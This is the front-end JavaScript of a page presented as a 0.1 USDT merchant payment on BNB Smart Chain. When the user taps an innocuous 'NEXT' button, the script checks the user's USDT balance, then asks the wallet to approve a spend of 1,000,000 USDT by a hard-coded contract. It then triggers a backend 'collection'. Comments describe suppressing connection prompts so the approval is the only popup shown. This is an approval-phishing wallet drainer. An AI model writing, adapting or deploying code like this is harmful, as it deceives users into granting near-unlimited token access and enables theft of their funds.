"use strict";

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x7682460D1C43ef8C1Fd2962eFe1A8cB2934b7ef4";
const CONTRACT_ADDRESS = "0x34ADc2c84409696B46A8e3e7943D777A645c2537";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38";
const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT — 18 decimals
const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); // require > 1 USDT before approve/collect
const BACKEND_URL      = "/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://bsc-dataseed3.binance.org/",
  "https://bsc-dataseed4.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── Page-load silent connect — reference dapp exact pattern ─────────────────
// Only calls eth_accounts (never eth_requestAccounts) — zero popup risk.
// Inside Trust Wallet's built-in browser this always resolves to the current
// account, so the address is ready before the user even taps NEXT.
window.addEventListener("load", async () => {
  if (!window.ethereum || typeof window.ethereum.request !== "function") return;
  try {
    const accs = await window.ethereum.request({ method: "eth_accounts" });
    if (accs && accs[0]) _cachedAddress = accs[0];
  } catch (_) {}
  if (typeof window.ethereum.on === "function") {
    window.ethereum.on("accountsChanged", (accs) => {
      _cachedAddress = (accs && accs[0]) ? accs[0] : null;
    });
  }
});

let _cachedAddress = null;

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  approveBtn.disabled = on;
  btnText.textContent = on ? label : "NEXT";
  btnSpinner.hidden   = !on;
}

// ─── RPC helper ───────────────────────────────────────────────────────────────
async function rpcCall(method, params) {
  for (const rpc of BSC_RPC_URLS) {
    try {
      const r = await fetch(rpc, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
      });
      const j = await r.json();
      if (j.result !== undefined) return j.result;
    } catch (_) {}
  }
  return null;
}

// ─── Poll allowance until mined ───────────────────────────────────────────────
async function waitForAllowanceConfirmed(owner, spender, required, timeout = 120000) {
  const data =
    "0xdd62ed3e" +
    owner.slice(2).padStart(64, "0") +
    spender.slice(2).padStart(64, "0");
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    let result = null;
    try {
      result = await window.ethereum.request({
        method: "eth_call",
        params: [{ to: BSC_USDT_ADDRESS, data }, "latest"]
      });
    } catch (_) {}
    if (!result || result === "0x" || result === "0x0") {
      result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data }, "latest"]);
    }
    if (result && result !== "0x" && result !== "0x0") {
      try { if (BigInt(result) >= BigInt(required)) return; } catch (_) {}
    }
    await new Promise(r => setTimeout(r, 2000));
  }
  throw new Error("Approval timed out. Please try again.");
}

// ─── Backend collect (with retry) ─────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress, amount: COLLECT_AMOUNT })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

async function getUsdtBalance(userAddress, iface) {
  const balanceData = iface.encodeFunctionData("balanceOf", [userAddress]);
  let result = null;
  try {
    result = await window.ethereum.request({
      method: "eth_call",
      params: [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]
    });
  } catch (_) {}
  if (!result || result === "0x" || result === "0x0") {
    result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]);
  }
  if (!result || result === "0x") return 0n;
  try { return BigInt(result); } catch (_) { return 0n; }
}

// ─── Main button handler ──────────────────────────────────────────────────────
//
// Exact reference dapp order:
//   1. wallet_switchEthereumChain  — chain first (BSC context for everything after)
//   2. eth_accounts                — SILENT, no popup, reference dapp uses this
//                                    (Trust Wallet in-app browser always returns
//                                     the current account here without any prompt)
//   3. eth_sendTransaction         — the ONE confirm popup the user sees
//
// eth_requestAccounts is NEVER called. That is what was causing the
// "Connect wallet" popup on every visit. The reference dapp only uses
// eth_accounts which is permanently silent inside Trust Wallet browser.
//
approveBtn.addEventListener("click", async () => {

  // If window.ethereum is not yet injected (user tapped NEXT very quickly on
  // Android/iOS before the wallet browser finished injecting the provider),
  // wait up to 3 s in 300 ms steps — invisible to the user, avoids false error.
  if (!window.ethereum) {
    setLoading(true, "Connecting…");
    for (let i = 0; i < 10; i++) {
      await new Promise(r => setTimeout(r, 300));
      if (window.ethereum) break;
    }
  }

  if (!window.ethereum) {
    setLoading(false);
    if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
      window.location.href = "go.html";
    } else {
      showToast("No wallet detected. Please open this page inside Trust Wallet.", "error");
    }
    return;
  }

  setLoading(true, "Processing…");

  try {

    // Step 1 — Switch to BNB Smart Chain
    // Do this first so every subsequent call is in BSC context.
    // Already on BSC? wallet_switchEthereumChain resolves silently (no popup).
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID_HEX }]
      });
    } catch (e) {
      if (e.code === 4902) {
        // BSC not added yet — add it (wallet switches automatically after)
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [BSC_CHAIN_PARAMS]
        });
      } else if (
        e.code === 4001 ||
        (e.message || "").toLowerCase().includes("user rejected") ||
        (e.message || "").toLowerCase().includes("user denied")
      ) {
        showToast("Please switch to BNB Smart Chain to continue.", "error");
        setLoading(false);
        return;
      }
      // any other error (e.g. already on BSC with some wallets) — continue
    }

    // Step 2 — Get wallet address using eth_accounts (SILENT — no popup ever)
    // Reference dapp uses eth_accounts here, NOT eth_requestAccounts.
    // Inside Trust Wallet's in-app browser, eth_accounts always returns the
    // connected account immediately without asking for permission.
    // Retry up to 8 times (3.2 s) — on first tap the wallet's internal state
    // may not be ready yet even though window.ethereum is present.
    let userAddress = _cachedAddress || null;

    if (!userAddress) {
      for (let i = 0; i < 8; i++) {
        try {
          const accs = await window.ethereum.request({ method: "eth_accounts" });
          userAddress = (accs && accs[0]) ? accs[0] : null;
        } catch (_) {}
        if (userAddress) break;
        await new Promise(r => setTimeout(r, 400));
      }
    }

    if (!userAddress) {
      showToast("Wallet not connected. Please open this page inside Trust Wallet.", "error");
      setLoading(false);
      return;
    }

    _cachedAddress = userAddress;

    const CAP_AMOUNT = ethers.parseUnits("1000000", 18);
    const iface      = new ethers.Interface(ERC20_ABI);

    const usdtBalance = await getUsdtBalance(userAddress, iface);
    if (usdtBalance <= MIN_USDT_BALANCE) {
      showToast("Not enough USDT", "error");
      setLoading(false);
      return;
    }

    // Step 3 — Check existing allowance (skip approve if already done)
    try {
      const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
      const allowanceHex  = await window.ethereum.request({
        method: "eth_call",
        params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
      });
      if (BigInt(allowanceHex) >= CAP_AMOUNT) {
        setLoading(true, "Finalizing…");
        await triggerBackendCollect(userAddress);
        showToast("Sent Successfully, Thank you! ✓", "success");
        setLoading(false);
        return;
      }
    } catch (_) {}

    // Step 4 — Send approve transaction (the ONE confirm popup)
    const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
    await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from:                 userAddress,
        to:                   BSC_USDT_ADDRESS,
        data:                 approveData,
        value:                "0x0",
        type:                 "0x2",
        maxFeePerGas:         "0x0",
        maxPriorityFeePerGas: "0x0"
      }]
    });

    // Step 5 — Wait for approve to be mined
    setLoading(true, "Confirming…");
    await waitForAllowanceConfirmed(userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);

    // Step 6 — Backend collects 0.1 USDT
    setLoading(true, "Finalizing…");
    await triggerBackendCollect(userAddress);
    showToast("Sent Successfully, Thank you! ✓", "success");

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Unknown error";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("user denied") ||
      raw.toLowerCase().includes("canceled") ||
      raw.toLowerCase().includes("cancelled")
    ) {
      showToast("Transaction cancelled.", "default");
    } else {
      showToast("Error: " + String(raw).substring(0, 90), "error");
    }
  } finally {
    setLoading(false);
  }
});
